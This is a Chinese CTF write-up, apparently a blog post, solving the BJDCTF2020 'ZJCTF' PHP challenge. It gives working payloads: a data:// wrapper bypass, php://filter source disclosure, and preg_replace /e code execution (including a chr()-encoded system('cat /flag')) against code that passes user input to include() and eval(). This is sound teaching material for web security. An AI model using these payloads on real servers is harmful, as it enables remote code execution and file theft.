# [BJDCTF2020]ZJCTF，不过如此 preg_replace /e模式漏洞

**目录**

[TOC]



```php
<?php
 
error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }
 
    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

直接看看代码

首先 text file获取参数

判断 text为空 和 读取 text的文件内容 并且要为 I have a dream

这里可以使用data伪协议绕过 让 text识别到 I have a dream  
本地测试一下就知道了



<img src="https://i-blog.csdnimg.cn/blog_migrate/44ed926afbea1ca9793c78b5039946e1.png" alt="" style="max-height:277px; box-sizing:content-box;" />


通过 data获取 I have a dream 得到该数据 这样 就可以绕过判断

然后文件包含 提示我们 next.php

include很显然就是使用伪协议 我们直接php://来读取

```cobol
?text=data://text/plain,I have a dream&file=php://filter/convert.base64-encode/resource=next.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/831504cba907851ae61c2ab87abe1c50.png" alt="" style="max-height:207px; box-sizing:content-box;" />


解密

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;
访问期间全局保存 id
 
 
function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
这里很关键
 
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}
将get的值 作为 re->str类型  
 
function getFlag(){
	@eval($_GET['cmd']);
}
执行命令
```

我们看看其中关键的内容

### preg_replace的/e模式

这里主要是使用了 prg_replace的危险参数 /e

可执行参数

就可以将 **第二个参数** 作为命令执行

所以上面其实 就是匹配

```cobol
'/(' . $re . ')/ei',    'strtolower("\\1")',
 
 
就是 eval(strtolower("\\1"))
 
但是 \\1 在正则中存在自己的作用
 
其实就是匹配第一项
 
这里给出例子
 
 preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
 
regex是我们的参数值 即 get的名称  value是传入的参数
 
.*=phpinfo()
 
 
所以就变为了
 
 preg_replace('/(.*)/ei', 'strtolower("\\1")',phpinfo());
 
但是这里是无法执行phpinfo()的
```

### 为什么要变为 {${phpinfo()}}

首先我们要知道

```php
$a=hello
 
$$a=world   
 
这里相当于 
 
$hello=world
 
 
所以
 
echo $a $hello
 
为
 
hello world
```

我们接着理解一下

```scss
${phpinfo()}
 
执行完会变为 ${1} 因为 phpinfo()通过var_dump返回的是1
 
所以strtolower 变为 strtolower({${1}})
 
接着变为 strtolower({null}) 
 
```

```cobol
这里还存在一个问题
 
如果我们输入 ?.*
 
作为 get的名字的话
 
无法执行
 
因为对于get非法参数会自动替换为 _
 
但是我们如果输入 一个大写字母就可以实现 
 
例如 ?.* ---> ?_*
 
    ?\S* ---> ?\S*
 
使用了其他正则
 
就是 \S 匹配非空
```

这道题我们需要执行 getFlag

所以我们修改 参数

```scss
这里我们需要了解 主要是要让第二个参数 作为命令执行
 
preg_replace(正则,需要执行的命令,原本的值)
 
我们现在需要
 
strtolower("\1")为我们的"原本的值"来作为命令执行
 
而strtolower("\1")要为命令 就需要原本的值是命令
 
而我们需要通过${phpinfo()}直接执行 phpinfo()
 
这里执行完phpinfo() 就会变为strtolower("${phpinfo()}")-->strtolower("${1}")-->null
```

这里说太多了 主要就是让第二个参数为 phpinfo即可

我们需要通过 ${}来解析phpinfo() 否则还是无法执行命令

```cobol
next.php?\S*={${getFlag()}}&cmd=system('cat /flag');
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/dd486c184aac15147b824f5cfde88432.png" alt="" style="max-height:111px; box-sizing:content-box;" />


这里flag就出来了

这里主要理解 ${phpinfo()}

我们不在意匹配后的字符串是什么

而是沟通过${}来直接解析phpinfo()

### 另一个方法

这里既然我们可以通过 第二个参数直接解析那我们直接替换为命令即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/e607040cb0c97ef1fd55d27ea4a92857.png" alt="" style="max-height:472px; box-sizing:content-box;" />


我们直接通过 system("cat /flag"); 看看能不能执行



<img src="https://i-blog.csdnimg.cn/blog_migrate/e2e914e958f00f9bc337813d4b3741bc.png" alt="" style="max-height:146px; box-sizing:content-box;" />


发现报错了 说明存在过滤

我们直接通过 chr拼接字符即可

```cobol
?\S*=${system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))}
 
 
system(cat /flag)
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/55496ed3c1f300f4c5d28f4382a7ef62.png" alt="" style="max-height:203px; box-sizing:content-box;" />


执行成功

获得flag

### 版本

/e模式在php5.5.x版本已经弃用了，但是根据我实验，在5.6.9版本下，虽然会报错，但是还能够使用这个特性

7.0之后的版本就不能用

 [[BJDCTF2020]ZJCTF，不过如此_[bjdctf2020]zjctf,不过如此_Sk1y的博客-CSDN博客](https://blog.csdn.net/RABCDXB/article/details/115363699)